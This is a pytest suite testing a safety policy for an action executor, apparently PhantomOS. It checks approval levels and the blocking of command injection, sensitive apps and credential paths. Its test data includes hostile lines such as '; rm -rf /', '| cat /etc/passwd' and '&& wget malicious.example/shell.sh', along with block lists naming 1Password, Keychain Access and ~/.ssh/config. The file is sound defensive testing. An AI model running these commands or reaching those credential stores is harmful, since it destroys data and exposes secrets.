"""Security invariants for PhantomOS action execution."""

from __future__ import annotations

import asyncio

import pytest

from phantom.actions.executor import ActionExecutor
from phantom.models import ActionRequest, ActionResult, PhantomActionType, TrustLevel
from phantom.safety.policy import SafetyPolicy


@pytest.mark.parametrize(
    "payload",
    [
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& wget malicious.example/shell.sh",
    ],
)
def test_command_injection_never_reaches_dispatch(payload, monkeypatch):
    policy = SafetyPolicy()
    policy.trust_level = TrustLevel.AUTO_EXECUTE
    executor = ActionExecutor(safety=policy)
    dispatched = []
    monkeypatch.setattr(executor, "_dispatch", lambda request: dispatched.append(request))
    result = asyncio.run(
        executor.execute(
            ActionRequest(
                type=PhantomActionType.RUN_COMMAND, params={"command": f"echo ok {payload}"}
            )
        )
    )
    assert result.success is False
    assert dispatched == []


def test_approve_each_denies_without_approval_callback(monkeypatch):
    policy = SafetyPolicy()
    policy.trust_level = TrustLevel.APPROVE_EACH
    executor = ActionExecutor(safety=policy)
    dispatched = []
    monkeypatch.setattr(executor, "_dispatch", lambda request: dispatched.append(request))
    result = asyncio.run(
        executor.execute(ActionRequest(type=PhantomActionType.TYPE_TEXT, params={"text": "hello"}))
    )
    assert result.success is False
    assert result.error == "Rejected by user"
    assert dispatched == []


def test_approve_each_executes_after_explicit_approval(monkeypatch):
    policy = SafetyPolicy(approval_callback=lambda _request: True)
    policy.trust_level = TrustLevel.APPROVE_EACH
    executor = ActionExecutor(safety=policy)
    monkeypatch.setattr(
        executor, "_dispatch", lambda request: ActionResult(success=True, action_type=request.type)
    )
    result = asyncio.run(
        executor.execute(ActionRequest(type=PhantomActionType.TYPE_TEXT, params={"text": "hello"}))
    )
    assert result.success is True


def test_approve_new_trust_is_exact_action_not_type_wide(monkeypatch):
    policy = SafetyPolicy(approval_callback=lambda _request: True)
    policy.trust_level = TrustLevel.APPROVE_NEW
    executor = ActionExecutor(safety=policy)
    monkeypatch.setattr(
        executor, "_dispatch", lambda request: ActionResult(success=True, action_type=request.type)
    )
    first = ActionRequest(
        type=PhantomActionType.TYPE_TEXT, params={"text": "approved text"}, source="recipe:test"
    )
    for _ in range(5):
        assert asyncio.run(executor.execute(first)).success
    assert policy.requires_approval(first) is False
    different = ActionRequest(
        type=PhantomActionType.TYPE_TEXT, params={"text": "different text"}, source="recipe:test"
    )
    assert policy.requires_approval(different) is True


def test_sequence_child_cannot_bypass_blocked_command(monkeypatch):
    policy = SafetyPolicy()
    policy.trust_level = TrustLevel.AUTO_EXECUTE
    executor = ActionExecutor(safety=policy)
    dispatched = []
    monkeypatch.setattr(executor, "_dispatch", lambda request: dispatched.append(request))
    request = ActionRequest(
        type=PhantomActionType.SEQUENCE,
        params={
            "steps": [
                {"type": "wait", "params": {"seconds": 0}},
                {"type": "run_command", "params": {"command": "sudo rm -rf /"}},
            ]
        },
    )
    result = asyncio.run(executor.execute(request))
    assert result.success is False
    assert dispatched == []


@pytest.mark.parametrize(
    "app",
    [
        "1Password",
        "1password",
        "  1PASSWORD  ",
        "1Password Helper",
        "Keychain Access",
        "System Preferences",
        "System Settings",
        "system settings",
        "Disk Utility",
    ],
)
def test_sensitive_app_identity_normalization(app):
    policy = SafetyPolicy()
    policy.trust_level = TrustLevel.AUTO_EXECUTE
    assert (
        policy.allow(ActionRequest(type=PhantomActionType.APP_ACTIVATE, params={"app": app}))
        is False
    )


def test_run_command_cannot_bypass_blocked_app():
    policy = SafetyPolicy()
    request = ActionRequest(
        type=PhantomActionType.RUN_COMMAND, params={"command": ["killall", "1Password"]}
    )
    assert policy.allow(request) is False


@pytest.mark.parametrize(
    "command",
    [
        ["killall", "-m", "."],
        ["killall", "-m", "1Pass.*"],
        ["killall", "-u", "someone", "Safari"],
        ["killall", "-TERM", "Safari"],
        ["killall"],
    ],
)
def test_killall_rejects_selector_regex_and_option_forms(command):
    assert (
        SafetyPolicy().allow(
            ActionRequest(type=PhantomActionType.RUN_COMMAND, params={"command": command})
        )
        is False
    )


def test_killall_allows_literal_non_sensitive_process_name():
    policy = SafetyPolicy()
    policy.trust_level = TrustLevel.AUTO_EXECUTE
    assert (
        policy.allow(
            ActionRequest(
                type=PhantomActionType.RUN_COMMAND, params={"command": ["killall", "Slack"]}
            )
        )
        is True
    )


@pytest.mark.parametrize(
    "command",
    [
        ["open", "-a", "1Password"],
        ["open", "-a", "1password"],
        ["open", "-n", "-a", "Keychain Access"],
        ["open", "/Applications/Disk Utility.app"],
        ["open", "/Applications/1Password Helper.app"],
        ["open", "-b", "com.example.alias"],
        ["open", "--args", "unexpected"],
        ["open", "-u", "https://example.com"],
    ],
)
def test_open_command_rejects_blocked_or_unsupported_semantics(command):
    assert (
        SafetyPolicy().allow(
            ActionRequest(type=PhantomActionType.RUN_COMMAND, params={"command": command})
        )
        is False
    )


def test_open_command_allows_explicit_safe_subset():
    policy = SafetyPolicy()
    policy.trust_level = TrustLevel.AUTO_EXECUTE
    for command in (
        ["open", "https://example.com"],
        ["open", "-a", "Safari"],
        ["open", "-n", "-g", "-a", "Safari", "https://example.com"],
    ):
        assert (
            policy.allow(
                ActionRequest(type=PhantomActionType.RUN_COMMAND, params={"command": command})
            )
            is True
        )


def test_run_command_cannot_bypass_blocked_path():
    assert (
        SafetyPolicy().allow(
            ActionRequest(
                type=PhantomActionType.RUN_COMMAND, params={"command": ["open", "~/.ssh/config"]}
            )
        )
        is False
    )


def test_auto_execute_still_respects_blocklists():
    policy = SafetyPolicy()
    policy.trust_level = TrustLevel.AUTO_EXECUTE
    assert (
        policy.allow(
            ActionRequest(type=PhantomActionType.APP_ACTIVATE, params={"app": "1Password"})
        )
        is False
    )
